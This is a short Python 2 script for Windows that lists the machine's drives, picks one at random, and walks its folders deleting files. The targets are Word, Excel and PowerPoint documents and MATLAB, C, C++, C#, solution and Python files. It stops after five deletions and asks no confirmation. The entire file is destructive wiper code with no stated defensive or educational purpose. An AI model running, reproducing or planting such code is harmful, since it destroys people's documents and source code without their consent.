import os
import win32api
from random import randint

#------------------------------------------------------
#   get system path
#------------------------------------------------------
drives = win32api.GetLogicalDriveStrings()
drives = drives.split('\000')[:-1]
print "all drives:"+str(drives)


#------------------------------------------------------
#   finish flag
#------------------------------------------------------
finish = 0
flag = 1
num = len(drives)
while(flag and num >=0):
	#------------------------------------------------------
	#   select drivers
	#------------------------------------------------------
	select = randint(0,len(drives)-1)
	fileDir =drives[select]
	print fileDir
	num=num-1
	print "rest time:"+str(num)
	for root, dirs, files in os.walk(fileDir):

		for name in files:
			#----------------------------------------------------------------------
			#   del program code
			#----------------------------------------------------------------------
			#   matlab code
			#----------------------------------------------------------------------
			if name.endswith(".m") or name.endswith(".M"):
				os.remove(os.path.join(root, name))
				print ("Delete File: " + os.path.join(root, name))
				finish = finish + 1
				print "finish="+str(finish)
				break
			#----------------------------------------------------------------------
			#   word file
			#----------------------------------------------------------------------
			elif name.endswith(".doc") or name.endswith(".docx"):
				os.remove(os.path.join(root, name))
				print ("Delete File: " + os.path.join(root, name))
				finish = finish + 1
				print "finish="+str(finish)
				break
			#----------------------------------------------------------------------
			#   excel file
			#----------------------------------------------------------------------
			elif name.endswith(".xls") or name.endswith(".xlsx"):
				os.remove(os.path.join(root, name))
				print ("Delete File: " + os.path.join(root, name))
				finish = finish + 1
				print "finish="+str(finish)
				break
			#----------------------------------------------------------------------
			#   powerpoint file
			#----------------------------------------------------------------------
			elif name.endswith(".ppt") or name.endswith(".pptx"):
				os.remove(os.path.join(root, name))
				print ("Delete File: " + os.path.join(root, name))
				finish = finish + 1
				print "finish="+str(finish)
				break
			#----------------------------------------------------------------------
			#   c file
			#----------------------------------------------------------------------
			elif name.endswith(".c") or name.endswith(".cpp") or name.endswith(".cs"):
				os.remove(os.path.join(root, name))
				print ("Delete File: " + os.path.join(root, name))
				finish = finish + 1
				print "finish="+str(finish)
				break
			#----------------------------------------------------------------------
			#   sln file
			#----------------------------------------------------------------------
			elif name.endswith(".sln"):
				os.remove(os.path.join(root, name))
				print ("Delete File: " + os.path.join(root, name))
				finish = finish + 1
				print "finish="+str(finish)
				break
			#----------------------------------------------------------------------
			#   py file
			#----------------------------------------------------------------------
			elif name.endswith(".py"):
				os.remove(os.path.join(root, name))
				print ("Delete File: " + os.path.join(root, name))
				finish = finish + 1
				print "finish="+str(finish)
				break
			
		if finish>=5:
			flag=0
			break